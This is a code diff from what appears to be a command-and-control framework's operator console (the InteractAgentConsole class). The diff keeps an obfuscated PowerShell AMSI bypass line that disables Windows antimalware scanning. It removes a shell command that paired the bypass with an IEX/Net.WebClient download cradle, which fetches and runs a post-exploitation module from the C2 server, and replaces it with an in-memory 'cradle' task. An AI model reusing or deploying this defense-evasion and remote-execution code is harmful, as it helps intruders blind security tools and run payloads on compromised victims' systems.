@@ -239,13 +239,9 @@ class InteractAgentConsole(BaseConsole):
         module_id = 0
         for module in Api.get_available_post_modules():
             if module['name'] == args:
-                amsi_bypass = "[ReF].AsSeMbly.GeTType('System.Mana'+'gement.Automa'+'tion.'+$([Text.Encoding]::Unicode.GetStriNg([ConveRt]::fromBasE64String('QQBtAHMAaQBVA'+'HQAaQBsAHMA')))).GetField($([Text.Encoding]::UniCode.GEtString([Convert]::FromBase64String('YQBtAHMAaQBJAG4A'+'aQB0AEYAYQBpA'+'GwAZQBkAA=='))),'NoNPublIc,St'+'atic').setvALuE($null,$true)"
-                # TODO obfuscate amsi bypass
-                # amsi_bypass = obfuscate_powershell(amsi_bypass)
-                script = f"{amsi_bypass}; IEX(New-Object Net.WebClient).DownloadString('{API_BASE}/api/dl/{module_id}')"
-                script += f"; {module['command']}"
 
-                Api.add_agent_task(self.selected_agent['name'], f"shell {script}")
+                # execute in memory
+                Api.add_agent_task(self.selected_agent['name'], f"cradle {module_id}")
 
                 success(f"Queued module execution: {args} to agent {self.selected_agent['name']}")
                 time.sleep(4)  # TODO either wait for a signal or make a global variable indicating whether result returned
